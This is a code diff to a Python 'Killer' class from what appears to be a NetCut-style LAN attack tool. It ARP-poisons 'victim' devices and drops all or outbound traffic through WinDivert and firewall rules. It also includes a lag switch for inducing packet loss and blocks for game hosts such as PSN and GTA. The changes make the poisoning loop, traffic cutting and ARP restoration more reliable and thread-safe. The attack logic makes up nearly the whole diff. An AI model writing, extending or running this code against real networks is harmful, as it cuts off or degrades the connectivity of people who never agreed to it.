@@ -8,8 +8,8 @@ import threading
 from typing import Optional
 
 from networking.hostblock import HostBlocklist
-from tools.firewall import block_all_for, unblock_all_for
-from tools.utils import threaded, get_default_iface
+from tools.firewall import block_all_for, unblock_all_for, block_ip
+from tools.utils import get_default_iface
 from constants import DUMMY_ROUTER
 
 log = logging.getLogger(__name__)
@@ -46,8 +46,8 @@ class Killer:
 
     def __init__(self, router: dict[str, object] = DUMMY_ROUTER) -> None:
         self.iface = get_default_iface()
-        # Use guid (Scapy/pcap name) for conf.iface, not friendly name
-        conf.iface = self.iface.guid if self.iface.guid else self.iface.name
+        # Every socket/send is explicitly scoped to this instance's interface.
+        # Do not change Scapy's process-global default for unrelated operations.
         # NOTE: kernel IP forwarding is NOT enabled here. A full kill must NOT
         # forward — on Windows, enabling IPEnableRouter globally makes the box
         # route the ARP-poisoned traffic, so the victim keeps internet (the cut
@@ -57,6 +57,7 @@ class Killer:
         # traffic, plus a WinDivert drop-all backstop on Windows.
         self.router: dict[str, object] = router
         self.killed: dict[str, dict[str, object]] = {}
+        self._restore_pending: dict[str, dict[str, object]] = {}
         self.storage: dict[str, dict[str, object]] = {}
         self.pf_blocks: set[str] = set()
         # Windows kernel-forwarder handles, keyed by victim IP (WinDivert path).
@@ -70,7 +71,8 @@ class Killer:
         # (netsh can't filter forwarded traffic); mac/linux use forward-chain rules.
         self._global_dst_blocks: set[str] = set()
         self._socket: Optional[object] = None  # Persistent L2 socket
-        self._lock: threading.Lock = threading.Lock()  # Guards killed, forwarders, pf_blocks
+        self._lock = threading.RLock()  # Guards lifecycle, sends and filter state
+        self._poison_stops: dict[str, threading.Event] = {}
         # Host-domain blocklist (PSN, GTA, …). On Windows the netsh firewall
         # filters only THIS host's traffic — a host block there wrongly cuts the
         # attacker's own access and does nothing for the forwarded victim. So on
@@ -98,13 +100,13 @@ class Killer:
                 self._socket = None
         return self._socket
     
-    def _send_packet(self, packet: object) -> None:
+    def _send_packet(self, packet: object) -> bool:
         """Send packet using persistent socket, fallback to new socket if needed."""
         sock = self._get_socket()
         if sock:
             try:
                 sock.send(packet)
-                return
+                return True
             except OSError as e:
                 log.debug('L2 socket send failed, recreating: %s', e)
                 self._close_socket()
@@ -114,8 +116,10 @@ class Killer:
             from scapy.all import sendp
             iface = self.iface.guid if hasattr(self.iface, 'guid') and self.iface.guid else self.iface.name
             sendp(packet, iface=iface, verbose=0)
+            return True
         except OSError as e:
             log.warning('Fallback sendp failed for %s: %s', self.iface.name, e)
+            return False
     
     def _close_socket(self) -> None:
         """Close persistent socket safely."""
@@ -126,7 +130,7 @@ class Killer:
                 log.debug('Socket close error (ignoring): %s', e)
             self._socket = None
     
-    def kill(self, victim: dict[str, object], wait_after: int = 2) -> None:
+    def kill(self, victim: dict[str, object], wait_after: int = 2) -> bool:
         """
         Full cut: ARP-poison the victim and drop all of its traffic.
 
@@ -138,19 +142,33 @@ class Killer:
         Returns immediately; poisoning runs on a background thread.
         """
         with self._lock:
+            self._restore_changed_address(victim)
+            # Establish the required Windows policy before starting a new
+            # routing session. An unavailable driver must be a visible failure.
+            if sys.platform.startswith('win') and not self._enforce_windivert_block(
+                    victim['ip'], drop_from_victim=True, drop_to_victim=True):
+                return False
             if victim['mac'] in self.killed:
-                return
+                return True
             self.killed[victim['mac']] = victim
+            self._poison(victim, wait_after)
+            return True
 
-        # Windows: guarantee the cut with a kernel drop-all backstop.
-        if sys.platform.startswith('win'):
-            self._enforce_windivert_block(
-                victim['ip'], drop_from_victim=True, drop_to_victim=True)
-
-        self._poison(victim, wait_after)
-
-    @threaded
     def _poison(self, victim: dict[str, object], wait_after: int = 2) -> None:
+        """Start one cancellable worker for this exact routing session."""
+        with self._lock:
+            if self.killed.get(victim['mac']) is not victim:
+                return
+            old = self._poison_stops.get(victim['mac'])
+            if old is not None:
+                old.set()
+            stop = threading.Event()
+            self._poison_stops[victim['mac']] = stop
+            threading.Thread(target=self._poison_loop,
+                             args=(victim, wait_after, stop), daemon=True).start()
+
+    def _poison_loop(self, victim: dict[str, object], wait_after: int,
+                     stop: threading.Event) -> None:
         """ARP-poison loop for an already-registered victim (``self.killed``).
 
         Shared by full ``kill`` and ``one_way_kill`` — the drop *policy* differs
@@ -177,12 +195,17 @@ class Killer:
             hwdst=self.router['mac']
         )
 
-        while victim['mac'] in self.killed \
-            and self.iface.name != 'NULL':
-            # Send packets using persistent socket
-            self._send_packet(to_victim)
-            self._send_packet(to_router)
-            sleep(wait_after)
+        while not stop.is_set():
+            with self._lock:
+                if (stop.is_set() or self.iface.name == 'NULL'
+                        or self._poison_stops.get(victim['mac']) is not stop
+                        or victim['mac'] not in self.killed):
+                    return
+                # Serialize the membership check and sends with restoration:
+                # no stale worker can re-poison after unkill has restored ARP.
+                self._send_packet(to_victim)
+                self._send_packet(to_router)
+            stop.wait(wait_after)
 
     def spoof(self, victim: dict[str, object]) -> None:
         """Route a device's traffic through us — ARP-poison + kernel forwarding —
@@ -193,29 +216,46 @@ class Killer:
         so those features can act on it. Idempotent; unlike ``kill`` it starts no
         drop, and unlike a bare poison it enables forwarding so nothing is cut.
         """
+        if not enable_ip_forwarding():
+            raise RuntimeError('Kernel IP forwarding could not be enabled')
         with self._lock:
+            self._restore_changed_address(victim)
             new = victim['mac'] not in self.killed
             self.killed[victim['mac']] = victim
         if new:
             self._poison(victim)
         # Forward the (un-dropped) traffic at kernel speed so the routed device
         # keeps its connection (sysctl on mac/linux, IPEnableRouter on Windows).
-        enable_ip_forwarding()
         # Windows: a newly-routed device must inherit the active network-wide
         # destination blocks (mac/linux already catch it via forward-chain rules).
         if sys.platform.startswith('win') and self._global_dst_blocks:
             self.selective_block(str(victim['ip']), dst_ips=list(self._global_dst_blocks))
 
-    @threaded
-    def unkill(self, victim: dict[str, object]) -> None:
-        """
-        Unspoofing victim
-        """
-        with self._lock:
-            if victim['mac'] in self.killed:
-                self.killed.pop(victim['mac'])
+    def _restore_changed_address(self, victim: dict[str, object]) -> None:
+        pending = self._restore_pending.get(victim['mac'])
+        if pending is not None and not self.unkill(pending):
+            raise RuntimeError('Previous device restoration is still incomplete')
+        old = self.killed.get(victim['mac'])
+        if old is not None and old.get('ip') != victim.get('ip'):
+            if not self.unkill(old):
+                raise RuntimeError('Could not restore previous device address')
 
-        # Restore Victim and Router with correct mappings
+    def unkill(self, victim: dict[str, object]) -> bool:
+        """Stop routing and finish restoring mappings before returning."""
+        with self._lock:
+            victim = self.killed.pop(victim['mac'],
+                                     self._restore_pending.get(victim['mac'], victim))
+            self._restore_pending[victim['mac']] = victim
+            stop = self._poison_stops.pop(victim['mac'], None)
+            if stop is not None:
+                stop.set()
+            ok = self._restore_victims([victim])
+            if ok:
+                self._restore_pending.pop(victim['mac'], None)
+            return ok
+
+    def _restore_packets(self, victim: dict[str, object]) -> tuple:
+        """Correct the two mappings changed by routing this device."""
         to_victim = Ether(dst=victim['mac'])/ARP(
             op=2,
             psrc=self.router['ip'],
@@ -232,44 +272,58 @@ class Killer:
             hwdst=self.router['mac']
         )
 
-        if self.iface.name != 'NULL':
-            # Send restore packets 3 times
-            for _ in range(3):
-                self._send_packet(to_victim)
-                self._send_packet(to_router)
-                sleep(0.1)
-        self._remove_pf_block(victim['ip'])
-        self._remove_windivert_block(victim['ip'])
-        self._remove_selective(victim['ip'])
+        return to_victim, to_router
 
-    def kill_all(self, device_list: list[dict[str, object]]) -> None:
+    def _restore_victims(self, victims: list[dict[str, object]]) -> bool:
+        # Batch the repetitions so Restore All takes ~0.3s, not 0.3s per device.
+        ok = not victims or self.iface.name != 'NULL'
+        if victims and self.iface.name != 'NULL':
+            packets = [p for victim in victims for p in self._restore_packets(victim)]
+            for _ in range(3):
+                for packet in packets:
+                    ok = (self._send_packet(packet) is not False) and ok
+                sleep(0.1)
+        for victim in victims:
+            ok = self._remove_pf_block(victim['ip']) and ok
+            self._remove_windivert_block(victim['ip'])
+            self._remove_selective(victim['ip'])
+        return ok
+
+    def kill_all(self, device_list: list[dict[str, object]]) -> bool:
         """
         Safely kill all devices
         """
+        ok = True
         for device in device_list[:]:
             if device['admin']:
                 continue
-            if device['mac'] not in self.killed:
-                self.kill(device)
+            ok = self.kill(device) and ok
+        return ok
 
-    def unkill_all(self) -> None:
+    def unkill_all(self) -> bool:
         """
         Safely unkill all devices killed previously
         """
         with self._lock:
-            for mac in list(self.killed):
-                self.killed.pop(mac)
+            self._restore_pending.update(self.killed)
+            victims = list(self._restore_pending.values())
+            self.killed.clear()
+            for stop in self._poison_stops.values():
+                stop.set()
+            self._poison_stops.clear()
+            ok = self._restore_victims(victims)
+            if ok:
+                self._restore_pending.clear()
             for ip in list(self.pf_blocks):
-                self._remove_pf_block(ip)
-            wd_ips = list(self._wd_forwarders)
-            sel_ips = list(self._wd_selective)
+                ok = self._remove_pf_block(ip) and ok
+            for ip in list(self._wd_forwarders):
+                self._remove_windivert_block(ip)
+            for ip in list(self._wd_selective):
+                self._remove_selective(ip)
             self._global_dst_blocks.clear()
-        for ip in wd_ips:
-            self._remove_windivert_block(ip)
-        for ip in sel_ips:
-            self._remove_selective(ip)
-        # Close persistent socket when done
-        self._close_socket()
+            # Close only after every corrective packet has been sent.
+            self._close_socket()
+            return ok
     
     def store(self) -> None:
         """
@@ -300,7 +354,7 @@ class Killer:
 
             self.kill(old)
 
-    def one_way_kill(self, victim: dict[str, object]) -> None:
+    def one_way_kill(self, victim: dict[str, object]) -> bool:
         """
         Kill victim and block their outbound traffic.
         Uses kernel IP forwarding + a kernel-level drop (fast, no Python overhead).
@@ -314,32 +368,34 @@ class Killer:
             outbound (the netsh rule alone filtered the attacker's host, not the
             forwarded victim traffic).
         """
-        # Ensure victim is being ARP poisoned (without full kill's drop-all).
+        if not enable_ip_forwarding():
+            raise RuntimeError('Kernel IP forwarding could not be enabled')
         with self._lock:
+            self._restore_changed_address(victim)
             new = victim['mac'] not in self.killed
+            # Install the policy first: if setup fails, a previously unrouted
+            # device must remain untouched and the caller receives False.
+            if sys.platform.startswith('win'):
+                old = self._wd_forwarders.get(victim['ip'])
+                if not self._enforce_windivert_block(
+                        victim['ip'], drop_from_victim=True, drop_to_victim=False):
+                    return False
+                if not self._enforce_pf_block(victim['ip']):
+                    if old is None:
+                        self._remove_windivert_block(victim['ip'])
+                    else:
+                        self._enforce_windivert_block(
+                            victim['ip'], old.drop_from_victim, old.drop_to_victim)
+                    return False
+            elif not self._enforce_pf_block(victim['ip'], one_way=True):
+                return False
             self.killed[victim['mac']] = victim
-        if new:
-            self._poison(victim)
-            # Wait for poison to start
-            for _ in range(10):
-                sleep(0.1)
-                if victim['mac'] in self.killed:
-                    break
-
-        # One-way needs the ALLOWED (inbound) direction to keep flowing, so turn
-        # on kernel forwarding here (sysctl on mac/linux, IPEnableRouter on Windows)
-        # — unlike a full kill, which must not forward.
-        enable_ip_forwarding()
-
-        # Drop only the victim's outbound at kernel level (no slow Python forwarder).
-        if sys.platform.startswith('win'):
-            self._enforce_windivert_block(
-                victim['ip'], drop_from_victim=True, drop_to_victim=False)
-        # Keep the firewall block as a portable backstop on every OS.
-        self._enforce_pf_block(victim['ip'])
+            if new:
+                self._poison(victim)
+            return True
 
     def _enforce_windivert_block(self, victim_ip: str, drop_from_victim: bool = True,
-                                 drop_to_victim: bool = False) -> None:
+                                 drop_to_victim: bool = False) -> bool:
         """Start a WinDivert kernel drop for a victim with the given direction policy.
 
         Idempotent when the running policy already matches; if it differs (e.g.
@@ -347,22 +403,33 @@ class Killer:
         """
         with self._lock:
             existing = self._wd_forwarders.get(victim_ip)
-        if existing is not None:
-            if (getattr(existing, 'drop_from_victim', None) == drop_from_victim and
-                    getattr(existing, 'drop_to_victim', None) == drop_to_victim):
-                return  # already the right policy
-            self._remove_windivert_block(victim_ip)  # policy changed → replace
-        try:
-            from networking.windivert_forwarder import WinDivertForwarder, WINDIVERT_AVAILABLE
-            if not WINDIVERT_AVAILABLE:
-                return
-            fwd = WinDivertForwarder()
-            if fwd.start(victim_ip, drop_from_victim=drop_from_victim,
-                         drop_to_victim=drop_to_victim):
-                with self._lock:
-                    self._wd_forwarders[victim_ip] = fwd
-        except Exception as e:  # noqa: BLE001 - never let the kernel path break a kill
-            log.warning('WinDivert block failed for %s: %s', victim_ip, e)
+            if (existing is not None and getattr(existing, 'running', False)
+                    and getattr(existing, 'drop_from_victim', None) == drop_from_victim
+                    and getattr(existing, 'drop_to_victim', None) == drop_to_victim):
+                return True
+            fwd = None
+            try:
+                from networking.windivert_forwarder import WinDivertForwarder, WINDIVERT_AVAILABLE
+                if not WINDIVERT_AVAILABLE:
+                    return False
+                fwd = WinDivertForwarder()
+                if not fwd.start(victim_ip, drop_from_victim=drop_from_victim,
+                                 drop_to_victim=drop_to_victim):
+                    fwd.stop()
+                    return False
+                # Keep the old policy alive until the replacement is ready.
+                if existing is not None:
+                    existing.stop()
+                self._wd_forwarders[victim_ip] = fwd
+                return True
+            except Exception as e:  # driver errors are an explicit failed operation
+                if fwd is not None:
+                    try:
+                        fwd.stop()
+                    except Exception:  # noqa: BLE001
+                        pass
+                log.warning('WinDivert block failed for %s: %s', victim_ip, e)
+                return False
 
     def _remove_windivert_block(self, victim_ip: str) -> None:
         """Stop and drop the WinDivert forwarder for a victim IP, if any."""
@@ -392,7 +459,8 @@ class Killer:
         """
         if not sys.platform.startswith('win'):
             return False
-        enable_ip_forwarding()  # allowed flows must forward at kernel speed
+        if not enable_ip_forwarding():  # allowed flows must forward at kernel speed
+            return False
         with self._lock:
             st = self._wd_selective.setdefault(
                 victim_ip, {'ports': set(), 'dsts': set(), 'proto': None, 'fwd': None})
@@ -445,17 +513,17 @@ class Killer:
             dsts = sorted(st['dsts']) or None
             proto = st['proto']
             old = st['fwd']
-        if old is not None:
-            try:
-                old.stop()
-            except Exception:  # noqa: BLE001
-                pass
-        fwd = WinDivertForwarder()
-        ok = fwd.start(victim_ip, drop_from_victim=True, ports=ports,
-                       dst_ips=dsts, proto=proto)
-        with self._lock:
-            if victim_ip in self._wd_selective:
-                self._wd_selective[victim_ip]['fwd'] = fwd if ok else None
+            # Keep handle replacement serialized with cleanup; otherwise a
+            # concurrently removed entry can leave the new handle unowned.
+            if old is not None:
+                try:
+                    old.stop()
+                except Exception:  # noqa: BLE001
+                    pass
+            fwd = WinDivertForwarder()
+            ok = fwd.start(victim_ip, drop_from_victim=True, ports=ports,
+                           dst_ips=dsts, proto=proto)
+            st['fwd'] = fwd if ok else None
         if not ok:
             log.warning('Selective WinDivert block failed for %s', victim_ip)
         return ok
@@ -470,7 +538,7 @@ class Killer:
             except Exception as e:  # noqa: BLE001
                 log.debug('Selective stop error (ignoring): %s', e)
 
-    def lag(self, victim: dict[str, object], on: bool) -> None:
+    def lag(self, victim: dict[str, object], on: bool) -> bool:
         """Lag switch: toggle a full kernel drop of a (spoofed) victim on/off.
 
         The GUI flips this rapidly to induce latency/packet loss. The victim must
@@ -480,26 +548,32 @@ class Killer:
         ip = str(victim['ip'])
         if on:
             if sys.platform.startswith('win'):
-                self._enforce_windivert_block(ip, drop_from_victim=True, drop_to_victim=True)
+                return self._enforce_windivert_block(ip, drop_from_victim=True, drop_to_victim=True)
             else:
-                self._enforce_pf_block(ip)
+                return self._enforce_pf_block(ip)
         else:
             if sys.platform.startswith('win'):
                 self._remove_windivert_block(ip)
+                return True
             else:
-                self._remove_pf_block(ip)
+                return self._remove_pf_block(ip)
 
-    def _enforce_pf_block(self, victim_ip: str) -> None:
+    def _enforce_pf_block(self, victim_ip: str, one_way: bool = False) -> bool:
         if victim_ip in self.pf_blocks:
-            return
-        if block_all_for(self.iface.name, victim_ip):  # self-ensures pf/anchor
+            return True
+        applied = (block_ip(self.iface.name, victim_ip, 'out') if one_way
+                   else block_all_for(self.iface.name, victim_ip))
+        if applied:  # self-ensures pf/anchor
             self.pf_blocks.add(victim_ip)
+        return bool(applied)
 
-    def _remove_pf_block(self, victim_ip: str) -> None:
+    def _remove_pf_block(self, victim_ip: str) -> bool:
         if victim_ip not in self.pf_blocks:
-            return
-        unblock_all_for(victim_ip)
+            return True
+        if not unblock_all_for(victim_ip):
+            return False
         self.pf_blocks.discard(victim_ip)
+        return True
 
     # -- host / domain blocking (PSN, GTA, …) --------------------------------
 
@@ -563,3 +637,6 @@ class Killer:
         if stale:
             for victim_ip in list(self._wd_selective):
                 self.selective_unblock(victim_ip, dst_ips=list(stale))
+        if desired:
+            for victim_ip in self._spoofed_victim_ips():
+                self.selective_block(victim_ip, dst_ips=list(desired))
